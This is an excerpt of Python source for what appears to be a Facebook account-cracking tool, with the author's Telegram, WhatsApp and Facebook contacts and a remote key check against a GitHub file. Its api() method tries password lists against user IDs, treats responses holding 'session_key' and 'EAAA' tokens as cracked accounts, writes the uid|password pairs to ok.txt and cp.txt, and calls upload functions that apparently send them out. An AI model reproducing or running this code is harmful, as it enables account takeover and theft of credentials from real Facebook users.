...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://t.me/bashar_ahmadzai12"])
	exit(" [*] FACEBOOK :  https://www.facebook.com/afghanhalak002")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN WHATSAPP >> +93782989190")
	subprocess.check_output(["am", "start", "https://wa.me/+93782989190"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://raw.githubusercontent.com/Basharahmadzai002/Bashar-002/main/public.txt').text
			if basesplit in plr:
				key = basesplit
 ...
 > \033[0;95mFACEBOOK      : MRr  Bashar Ahmadzai
	...
	def api(self, uid, pwx):
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[𝑩𝒂𝒔𝒉𝒂𝒓 𝑶𝑲😍] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [𝑩𝒂𝒔𝒉𝒂𝒓 𝑶𝑲😍] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[𝑩𝒂𝒔𝒉𝒂𝒓-𝑪𝑷😭] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [𝑩𝒂𝒔𝒉𝒂𝒓-𝑪𝑷😭] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
